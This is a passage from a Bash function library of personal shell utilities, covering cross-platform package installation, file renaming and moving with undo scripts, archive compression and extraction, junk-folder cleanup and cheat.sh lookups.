            elif [ "${distro_ID}" = 'arch' ] || [ "${distro_ID}" = 'manjaro' ] ; then
                distro='Arch'
            fi
        elif [ "$(uname -o)" = 'Android' ]; then
            distro='Android'
        fi
    fi

    #--------------------------------------------------

    if [ "$(uname)" = 'Darwin' ]; then
        # check brew installed
        if [ -z "$(command -v brew)" ]; then
            _echo_danger 'error: Homebrew (https://brew.sh/) required to install dependencies\n'
            return 1
        fi

        _echo_info 'brew update\n'
        brew update

        _echo_info 'brew install\n'
        brew install

        return 0
    fi

    #--------------------------------------------------

    if [ "$(uname)" = 'FreeBSD' ]; then
        _echo_info "sudo pkg install \"$1\"\n"
        sudo pkg install "$1"

        return 0
    fi

    #--------------------------------------------------

    if [ "$(uname)" = 'OpenBSD' ]; then
        _echo_info "sudo pkg_add \"$1\"\n"
        sudo pkg_add "$1"

        return 0
    fi

    #--------------------------------------------------

    if [ "${distro}" = 'Debian' ] || [ "${distro}" = 'Kali' ]; then
        _echo_info 'sudo apt-get update\n'
        sudo apt-get update

        _echo_info "sudo apt-get install -y \"$1\"\n"
        sudo apt-get install -y "$1"

        return 0
    fi

    #--------------------------------------------------

    if [ "${distro}" = 'RedHat' ]; then
        _echo_info "sudo yum install -y \"$1\"\n"
        sudo yum install -y "$1"

        return 0
    fi

    #--------------------------------------------------

    if [ "${distro}" = 'Arch' ]; then
        _echo_info 'sudo pacman -Syu\n'
        sudo pacman -Syu

        _echo_info "sudo pacman -S \"$1\"\n"
        sudo pacman -S "$1"

        return 0
    fi

    #--------------------------------------------------

    if [ "${distro}" = 'Alpine' ]; then
        _echo_info 'apk update\n'
        apk update

        _echo_info "apk add \"$1\"\n"
        apk add "$1"

        return 0
    fi

    #--------------------------------------------------

    if [ "${distro}" = 'Android' ]; then
        _echo_info "pkg install \"$1\"\n"
        pkg install "$1"

        return 0
    fi
}

## Find / list installed apt packages
function pkg-installed() {
    #--------------------------------------------------
    # Check apt installation
    #--------------------------------------------------

    if [ -z "$(command -v 'apt')" ]; then
        _echo_danger 'error: apt not installed\n'
        return 1
    fi

    #--------------------------------------------------

    _echo_info 'apt list --installed\n'
    apt list --installed
}

## Find / list available apt packages
function pkg-list() {
    #--------------------------------------------------
    # Check apt installation
    #--------------------------------------------------

    if [ -z "$(command -v 'apt')" ]; then
        _echo_danger 'error: apt not installed\n'
        return 1
    fi

    #--------------------------------------------------

    _echo_info 'apt-cache pkgnames | sort\n'
    apt-cache pkgnames | sort
}

## Shortcut for apt-get remove -y
function pkg-remove() {
    #--------------------------------------------------
    # Check apt installation
    #--------------------------------------------------

    if [ -z "$(command -v 'apt')" ]; then
        _echo_danger 'error: apt not installed\n'
        return 1
    fi

    #--------------------------------------------------

    _echo_info "sudo apt-get remove -y \"$1\"\n"
    sudo apt-get remove -y "$1"
}

## Find / list available apt packages
function pkg-search() {
    #--------------------------------------------------
    # Check apt installation
    #--------------------------------------------------

    if [ -z "$(command -v 'apt')" ]; then
        _echo_danger 'error: apt not installed\n'
        return 1
    fi

    #--------------------------------------------------
    # Check argument count
    #--------------------------------------------------

    if [ "$#" -lt 1 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _echo_success 0 8 'usage:'; _echo_primary 'pkg-search [package_name]\n'
        return 1
    fi

    #--------------------------------------------------

    _echo_info "apt-cache search \"$*\"\n"
    apt-cache search "$*"
}

## Create symlink
function symlink() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'symlink [target] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local target

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'symlink\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Create or remove symbolic link\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    target=${arguments[${LBOUND}]}

    #--------------------------------------------------

    _echo_info "ln -s \"${target}\" ./\"$(basename "${target}")\"\n"
    ln -s "${target}" ./"$(basename "${target}")"
}

#--------------------------------------------------
# system dependant
#--------------------------------------------------

# system specific aliases
case "${OSTYPE}" in
    'cygwin'|'msys')
        echo cygwin msys &>/dev/null
    ;;
    'linux-androideabi')
        alias sudo='tsudo'  ## sudo alias (android)
        alias apt-get='pkg' ## apt-get alias (android)
        alias apt='pkg'     ## apt alias (android)
        
        export USER
        USER=$(whoami)
    ;;
    'linux-gnu')
        if [ "${DESKTOP_SESSION}" = 'ubuntu' ]; then
            alias -- --='cd -' ## Jump to last directory
        fi

        if [ "${XDG_CURRENT_DESKTOP}" = 'ubuntu:GNOME' ]; then
            alias tt='_echo_info "gnome-terminal --working-directory=`pwd`\n"; gnome-terminal --working-directory=`pwd`' ## Open current location in terminal
        fi

        if uname -rv | grep -qi 'microsoft'; then
            echo 'Windows Subsystem for Linux (WSL)' &>/dev/null
        fi
    ;;
esac

## Open file or folder with appropriate app
function open() {
    local ARGUMENTS

    ARGUMENTS=()
    for ARGUMENTS in "${@}"; do
        case "${OSTYPE}" in
            'cygwin'|'msys')
                start "${ARGUMENTS}";;
            'darwin'*)
                open "${ARGUMENTS}";;
            'linux-gnu'|'linux-androideabi')
                xdg-open "${ARGUMENTS}" &>/dev/null;;
            *) _echo_danger "error: ostype: \"${OSTYPE}\" is not handled\n"; return 1;;
        esac
    done
}

## Set XDG_CURRENT_PROJECT_DIR in ~/.config/user-dirs.dirs file
function set_xdg_current_project_dir() {
    if [ "${OSTYPE}" != linux-gnu ]; then
        _echo_danger "error: Not a Linux system. Skipping setting XDG_CURRENT_PROJECT_DIR.\n"

        return 0
    fi

    if [ ! -f "${HOME}/.config/user-dirs.dirs" ]; then
        _echo_danger "error: ${HOME}/.config/user-dirs.dirs file not found. Skipping setting XDG_CURRENT_PROJECT_DIR.\n"

        return 0
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${*}" ]; then
        _echo_danger 'error: some mandatory argument missing\n'
        _echo_success 'usage:' 2 8; _echo_primary 'set_xdg_current_project_dir [folder_path]\n'
        return 1
    fi

    if [ "$#" -gt 1 ]; then
        _echo_danger "error: too many arguments ($#)\n"
        _echo_success 'usage:' 2 8; _echo_primary 'set_xdg_current_project_dir [folder_path]\n'
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    set -- "$(realpath "$1")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "$1" ]; then
        _echo_danger "error: folder_path: \"$1\" is not a valid directory\n"
        _echo_success 'usage:' 2 8; _echo_primary 'set_xdg_current_project_dir [folder_path]\n'

        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    # a sed command to remove line starting with XDG_CURRENT_PROJECT_DIR=
    _echo_info "sed -i \"/^XDG_CURRENT_PROJECT_DIR=/d\" \"${HOME}/.config/user-dirs.dirs\"\n"
    sed -i "/^XDG_CURRENT_PROJECT_DIR=/d" "${HOME}/.config/user-dirs.dirs"

    # append XDG_CURRENT_PROJECT_DIR line to the end of the file
    _echo_info "echo \"XDG_CURRENT_PROJECT_DIR=\"$1\"\" >> \"${HOME}/.config/user-dirs.dirs\"\n"
    echo "XDG_CURRENT_PROJECT_DIR=\"$1\"" >> "${HOME}/.config/user-dirs.dirs"
}

## Change files extensions from given folder
function change-extensions() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'change-extensions [folder] -e [old extension] -n [new extension] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local _basename
    local current_directory
    local new_extension
    local new_path
    local old_extension
    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :e:n:h option; do
            case "${option}" in
                e) old_extension="${OPTARG}";;
                n) new_extension="${OPTARG}";;
                h) _echo_warning 'change-extensions\n';
                    _echo_success 'description:' 2 14; _echo_primary 'change files extensions from given folder\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 2 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Validate mandatory options
    #--------------------------------------------------

    if [ -z "${old_extension}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ -z "${new_extension}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${source}" ]; then
        _echo_danger "error: \"${source}\" is not a valid directory\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Sanitize parameter
    #--------------------------------------------------

    # remove leading dot from string if any
    # shellcheck disable=SC2001
    old_extension=$(echo "${old_extension}" | sed 's/^\.//')

    # shellcheck disable=SC2001
    new_extension=$(echo "${new_extension}" | sed 's/^\.//')

    #--------------------------------------------------

    find "${source}" -maxdepth 1 -type f -name "*.${old_extension}" | while read -r file_path; do
        # get basename without extension
        _basename="$(basename "${file_path}" ".${old_extension}")"

        # get current directory excluding last forward slash
        current_directory="$(realpath "$(dirname "${file_path}")")"

        # generate new path
        new_path="${current_directory}/${_basename}.${new_extension}"

        # no overwrite: ignore when file exists
        if [ -f "${new_path}" ]; then
            _echo_danger 'error: file already exists.\n'
        else
            # rename file
            _echo_info "mv -nv \"${file_path}\" \"${new_path}\"\n"
            mv -nv "${file_path}" "${new_path}"
        fi
    done
}

## Print help cheat.sh in your terminal
function cheat() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'cheat [promt] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local prompt

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'compress\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Print help cheat.sh in your terminal\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check curl installation
    #--------------------------------------------------

    if [ ! -x "$(command -v curl)" ]; then
        _echo_danger 'error: curl required, enter: "sudo apt-get install -y curl" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -lt 1 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    prompt="${arguments[${LBOUND}]}"

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    _echo_info "curl cheat.sh/\"${prompt}\"\n"
    curl cheat.sh/"${prompt}"
}

## Recursively delete junk from folders
function clean-folder() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'clean-folder [folder] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'clean-folder\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Recursively delete junk from folders\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${source}" ]; then
        _echo_danger "error: \"${source}\" is not a valid directory\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    _echo_info "find \"${source}\" -type f -iname desktop.ini -delete\n"
    find "${source}" -type f -iname desktop.ini -delete

    _echo_info "find \"${source}\" -type f -iname thumbs.db -delete\n"
    find "${source}" -type f -iname thumbs.db -delete

    _echo_info "find \"${source}\" -type f -name .DS_Store -delete\n"
    find "${source}" -type f -name .DS_Store -delete

    _echo_info "find \"${source}\" -type f -regex \".+_undo\.sh$\" -delete\n"
    find "${source}" -type f -regex ".+_undo\.sh$" -delete

    _echo_info "find \"${source}\" -type d -name \"__pycache__\" -exec rm -rf '{}' +\n"
    find "${source}" -type d -name "__pycache__" -exec rm -rf '{}' +

    _echo_info "find \"${source}\" -type d -name \"__MACOSX\" -exec rm -rf '{}' +\n"
    find "${source}" -type d -name "__MACOSX" -exec rm -rf '{}' +
}

## Compress a file, a folder or each subfolders into separate archives recursively with 7z
function compress() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'compress [source] [destination] -r (recursive) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local archive_name
    local count=1
    local destination
    local folder_path
    local recursive=false
    local source
    local total

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :hr option; do
            case "${option}" in
                r) recursive=true;;
                h) _echo_warning 'compress\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Compress a file, a folder or each subfolders into separate archives recursively \n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${arguments[${LBOUND}]}" -lt 1 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    # Check argument count
    if [ "${#arguments[@]}" -gt 2 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"
    destination="$(realpath "${arguments[((${LBOUND} + 1))]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -f "${source}" ] && [ ! -d "${source}" ]; then
        _echo_danger "error: \"${source}\" is invalid\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${destination}" ]; then
        _echo_danger "error: \"${destination}\" is not a valid directory\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    # If source is a folder and recursive option is on
    if [ -d "${source}" ] && [ "${recursive}" = true ]; then
        # cache file count
        total=$(find "${source}" -maxdepth 1 ! -path "${source}" -type d | wc -l)

        # ! -path "${source}" = avoid listing "."
        find "${source}" -maxdepth 1 ! -path "${source}" -type d | while read -r folder_path; do

            # if 7zip is installed
            if  [ -n "$(command -v 7z)" ]; then
                archive_name="$(basename "${folder_path}").7z"
                _echo_info "Compressing $(( count++ )) of ${total}...\n"

                _echo_info "7z a \"${destination}/${archive_name}\" \"${folder_path}\"\n"
                7z a "${destination}/${archive_name}" "${folder_path}"
            else
                archive_name="$(basename "${folder_path}").tar.gz"
                _echo_info "Compressing $(( count++ )) of ${total}...\n"

                _echo_info "tar -zcvf \"${destination}/${archive_name}\" \"${folder_path}\"\n"
                tar -zcvf "${destination}/${archive_name}" "${folder_path}"
            fi

        done
    else
        if  [ -n "$(command -v 7z)" ]; then
            archive_name="$(basename "${source}").7z"

            _echo_info "7z a \"${destination}/${archive_name}\" \"${source}\"\n"
            7z a "${destination}/${archive_name}" "${source}"
        else
            archive_name="$(basename "${source}").tar.gz"

            _echo_info "tar -zcvf \"${destination}/${archive_name}\" \"${source}\"\n"
            tar -zcvf "${destination}/${archive_name}" "${source}"
        fi
    fi
}

## Create a shortcut on user destop
function create-desktop-shortcut() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'create-desktop-shortcut [executable] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local source
    local _basename

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'clean-folder\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Create a shortcut on user destop\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -x "${source}" ]; then
        _echo_danger "error: \"${source}\" is not executable\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    # get basename without extension
    _basename="$(basename "${source}" | cut -d. -f1)"

    cat > ~/Desktop/"${_basename}".desktop <<EOT
[Desktop Entry]
Version=1.0
Type=Application
Terminal=false
Exec=${source}
Name=${_basename}
Comment=${_basename}
Icon=${source}
EOT

    sudo chmod 755 ~/Desktop/"${_basename}".desktop
}

## Extract tar archive
function extract() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'extract [archive] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local archive

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'archive\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Extract tar archive\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    archive="${arguments[${LBOUND}]}"

    #--------------------------------------------------

    _echo_info "tar -zxvf ${archive}\n"
    tar -zxvf "${archive}"
}

## Print help for desired command and flag
function help() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'help [command] (flag)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local flag

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "$#" -lt 1 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "$#" -gt 2 ]; then
        _echo_danger "error: too many arguments ($#)\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ "$#" -eq 1 ]; then
        _echo_info "$1 --help\n"
        "$1" --help

        return 0
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # escape "-" character
    flag=$(printf '%s' "$2" | sed 's/^-/\\-/')

    #--------------------------------------------------

    "$1" --help | grep -E "${flag}"
}

## Move all files from subfolders into current folder (no overwrite)
function move-all-files-here() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'move-all-files-here [source] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local count
    local extension
    local _basename
    local new_path
    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'compress\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Move all files from subfolders into current folder (no overwrite)\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -lt 1 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${source}" ]; then
        _echo_danger "error: \"${source}\" is not a valid directory\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    _echo_info "echo '#!/bin/bash' > \"${source}/move-all-files-here_undo.sh\"\n"
    echo '#!/bin/bash' > "${source}/move-all-files-here_undo.sh"

    # ! -path "${source}" = avoid listing "."
    find "${source}" ! -path "${source}" ! -name 'move-all-files-here_undo.sh' -type f | while read -r file_path; do

        # get extension including dot
        extension="$(echo "${file_path}" | grep -oE '\.[a-zA-Z0-9]+$')"

        # cache basename
        _basename="$(basename "${file_path}" "${extension}")"

        # generate new path
        new_path="$(pwd)/${_basename}${extension}"
        # no overwrite: append and increment suffix when file exists
        count=0
        while [ -f "${new_path}" ]; do
            ((count+=1))
            new_path="$(pwd)/${_basename}_${count}${extension}"
        done

        _echo_info "mv -vn \"${file_path}\" \"${new_path}\"\n"
        mv -vn "${file_path}" "${new_path}"

        # print undo
        printf 'mv -vn "%s" "%s"\n' "${new_path}" "${file_path}" >> "${source}/move-all-files-here_undo.sh"
    done
}

## Generate rename script
function rename-script-generator() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'rename-script-generator [folder] -d (include directories) -r (recursive) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local directory=false
    local file_path
    local longest=0
    local maxdepth=1
    local padding
    local relative_path
    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :drh option; do
            case "${option}" in
                d) directory=true;;
                r) maxdepth=99;;
                h) _echo_warning 'rename-script-generator\n';
                    _echo_success 'description:' 2 14; _echo_primary 'generate rename script\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------

    # Check source validity
    if [ ! -d "${source}" ]; then
        _echo_danger 'error: source must be folder\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    _echo_info "printf '\#!/bin/bash\\\n\\\n' > \"${source}/rename.sh\"\n"
    printf '#!/bin/bash\n\n' > "${source}/rename.sh"

    # find longest path name
    longest="$(find "${source}" -maxdepth "${maxdepth}" ! -name 'rename.sh' ! -path "${source}" -printf "%f\n" | awk 'length>max{max=length} END {print max}')"

    # ! -path "${source}" exclude parent directory
    # sort -t '\0' -n => sort output alphabetically
    find "${source}" -maxdepth "${maxdepth}" ! -name 'rename.sh' ! -path "${source}" | sort -t '\0' -n | while read -r file_path; do

        # exclude directories when required
        if [ -d "${file_path}" ] && [ "${directory}" = false ]; then
            continue
        fi

        # get relative path
        relative_path="$(realpath --relative-to "${source}" "${file_path}")"

        # compute padding length
        padding="$(printf " %$((longest-${#relative_path}))s")"

        # mv -n = do not overwrite
        echo "mv -vn \"${relative_path}\"${padding}\"${relative_path}\"" >> "${source}/rename.sh"

    done

    _echo_info "printf '\\\nrm rename.sh' >> \"${source}/rename.sh\"\n"
    printf '\nrm rename.sh' >> "${source}/rename.sh"

    #--------------------------------------------------

    # open with sublime text by default
    if [ -x "$(command -v subl)" ]; then
        _echo_info "subl \"${source}/rename.sh\"\n"
        subl "${source}/rename.sh"
    else
        _echo_info "${VISUAL} \"${source}/rename.sh\"\n"
        ${VISUAL} "${source}/rename.sh"
    fi
}

## Rename files recursively
function rename() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'rename [source] -r (recursive) -a (preserve accents) -e (remove extra char) -s (snake_case) -t (train-case) -l (lower case) -u (upper CASE) -h (help)\n'
    }

    #--------------------------------------------------
    # Declare subfunction
    #--------------------------------------------------

    function _rename() {
        # $1 = file_name

        local NEW_NAME
        local PARENT

        NEW_NAME="$(basename "$1")"

        if [ "${preserve}" = false ]; then
            NEW_NAME=$(echo "${NEW_NAME}" | sed 'y/àáâäçèéêëìíîïòóôöùúûüāēěīōūǎǐǒǔǖǘǚǜÀÁÂÄÇÈÉÊËÌÍÎÏÒÓÔÖÙÚÛÜĀĒĚĪŌŪǍǏǑǓǕǗǙǛ/aaaaceeeeiiiioooouuuuaeeiouaiouuuuuAAAACEEEEIIIIOOOOUUUUAEEIOUAIOUUUUU/')
        fi

        if [ "${extra}" = true ]; then
            NEW_NAME=$(echo "${NEW_NAME}" | sed -E 's/&|\+|\(|\)|\[|\]//g' | sed 's/__/_/g' | sed -E 's/_$//g')
        fi

        if [ "${lower}" = true ]; then
            NEW_NAME=$(echo "${NEW_NAME}" | tr '[:upper:]' '[:lower:]')
        elif [ "$upper" = true ]; then
            NEW_NAME=$(echo "${NEW_NAME}" | tr '[:lower:]' '[:upper:]')
        fi

        if [ "${snake}" = true ]; then
            NEW_NAME=$(echo "${NEW_NAME}" | tr ' ' '_' | tr '-' '_')
        elif [ "${train}" = true ]; then
